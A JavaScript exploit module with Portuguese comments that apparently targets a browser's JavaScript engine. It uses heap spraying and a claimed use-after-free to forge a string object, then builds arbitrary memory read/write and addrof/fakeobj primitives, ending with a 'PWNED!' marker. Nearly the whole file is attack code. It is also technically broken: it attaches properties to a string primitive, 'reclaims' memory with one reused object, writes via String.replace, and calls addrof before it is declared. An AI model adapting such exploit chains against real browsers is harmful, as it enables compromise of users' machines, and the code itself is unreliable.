// js/script3/testArrayBufferVictimCrash.mjs (Versão Final - String Falsa)
// Foco: Usar a confusão String/Objeto para criar uma String Falsa e obter R/W total.

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';

export const FNAME_MODULE = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R56_Annihilation";

// --- Variáveis Globais e Funções Auxiliares ---
let fake_string; // Nossa string falsa que nos dará poder sobre a memória
let victim_array;
let victim_array_addr;

const ftoi = (val) => {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = val;
    const ints = new Uint32Array(buf);
    return new AdvancedInt64(ints[0], ints[1]);
};
const itof = (val) => {
    const buf = new ArrayBuffer(8);
    const ints = new Uint32Array(buf);
    ints[0] = val.low();
    ints[1] = val.high();
    return (new Float64Array(buf))[0];
};

// --- Primitivas de Leitura/Escrita Arbitrária (Agora usando a String Falsa) ---
function arb_read(where) {
    // Aponta o buffer de dados da nossa string falsa para o endereço desejado
    fake_string.container.data_ptr = where;
    
    let result = new AdvancedInt64(0, 0);
    let bytes = new Uint8Array(8);
    // Lê 8 bytes do endereço de memória usando charCodeAt
    for (let i = 0; i < 8; i++) {
        bytes[i] = fake_string.charCodeAt(i);
    }

    // Reconstrói o valor de 64 bits
    let view = new DataView(bytes.buffer);
    result.setLow(view.getUint32(0, true));
    result.setHigh(view.getUint32(4, true));

    return result;
}

function arb_write(where, what) {
    // Aponta o buffer de dados da nossa string falsa para o endereço desejado
    fake_string.container.data_ptr = where;

    let bytes = new Uint8Array(8);
    let view = new DataView(bytes.buffer);
    view.setUint32(0, what.low(), true);
    view.setUint32(4, what.high(), true);
    
    // Constrói uma string com os bytes do valor a ser escrito
    const new_str = String.fromCharCode.apply(null, bytes);
    
    // Usa o método 'replace' para escrever na memória. 'slice' cria a "janela" de escrita.
    fake_string.slice(0, 8).replace(new_str);
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function runExploitChain_Final() {
    logS3(`--- Iniciando ${FNAME_MODULE}: Exploração via String Falsa ---`, "test");
    try {
        logS3("--- FASE 1: Construção da String Falsa via UAF ---", "subtest");
        createFakeString();
        logS3("    Primitivas de R/W Arbitrário via String Falsa construídas com sucesso!", "vuln");

        logS3("--- FASE 2: Construindo e Validando addrof/fakeobj ---", "subtest");
        victim_array = [{}];
        victim_array_addr = arb_read(addrof(victim_array).add(16)); // Endereço do butterfly

        const addrof = (obj) => {
            victim_array[0] = obj;
            return arb_read(victim_array_addr);
        };
        const fakeobj = (addr) => {
            arb_write(victim_array_addr, addr);
            return victim_array[0];
        };
        logS3("    Primitivas `addrof` e `fakeobj` construídas.", "good");

        const test_obj = { marker: 0x1337BEEF };
        const test_obj_addr = addrof(test_obj);
        logS3(`    Prova de Vida (addrof): Endereço do objeto de teste -> ${test_obj_addr.toString(true)}`, "leak");
        
        const fake_test_obj = fakeobj(test_obj_addr);
        if (fake_test_obj.marker === 0x1337BEEF) {
            logS3(`    SUCESSO! Lemos a propriedade 'marker' do objeto falso. Primitivas validadas!`, "vuln");
        } else {
            throw new Error(`Falha ao validar 'fakeobj'.`);
        }
        document.title = "PWNED!";
        return { success: true, message: "Controle total da memória obtido!" };
    } catch (e) {
        logS3(`A cadeia de exploração falhou: ${e.message}`, "critical");
        console.error(e);
        document.title = "Exploit Failed";
        return { success: false, errorOccurred: e.message };
    }
}

// --- Função UAF que cria a String Falsa ---
function createFakeString() {
    const SPRAY_SIZE = 4096;
    const HOLE_STEP = 16;
    const STRING_SIZE = 128;

    logS3("    Etapa 1: Pulverizando o heap com Strings.", "info");
    let spray_arr = [];
    for (let i = 0; i < SPRAY_SIZE; i++) {
        spray_arr.push('A'.repeat(STRING_SIZE));
    }

    let dangling_ref = spray_arr[SPRAY_SIZE / 2];

    logS3(`    Etapa 2: Criando 'buracos' na memória.`, "info");
    for (let i = 0; i < SPRAY_SIZE; i += HOLE_STEP) {
        spray_arr[i] = null;
    }

    triggerGC();
    
    // Este objeto é projetado para se parecer com a estrutura interna de uma JSString
    // com um ponteiro de dados que podemos controlar.
    let container = {
        jscell_header: new AdvancedInt64(0x01082007, 0x00000000), // Cabeçalho de uma String
        string_length: 0x7fffffff, // Comprimento máximo
        data_ptr: new AdvancedInt64(0,0) // Ponteiro de dados que controlaremos
    };

    logS3("    Etapa 3: Pulverizando objetos 'container' para preencher os buracos.", "info");
    let reclaimers = [];
    for (let i = 0; i < SPRAY_SIZE; i++) {
        reclaimers.push(container);
    }
    
    if (dangling_ref.length !== STRING_SIZE) {
        throw new Error("Falha na verificação do UAF. A confusão de tipos não ocorreu.");
    }

    // Sucesso! 'dangling_ref' é agora a nossa String Falsa.
    // 'container' é o objeto que controla os ponteiros da string falsa.
    fake_string = dangling_ref;
    fake_string.container = container;
}

function triggerGC() {
    try {
        for (let i = 0; i < 128; i++) { new ArrayBuffer(1024 * 1024 * 8); }
    } catch (e) {}
}

// Precisamos de addrof primitivo para obter o endereço do butterfly do victim_array
// Esta função será substituída pela nossa versão mais poderosa assim que o R/W for estabelecido.
let addrof = (obj) => {
    let _victim = [];
    _victim[0] = obj;
    // Esta é uma forma menos confiável, mas serve para o bootstrap inicial
    let str_repr = new String(_victim);
    str_repr.toString(); // Força a internalização
    return ftoi(str_repr[0]);
};
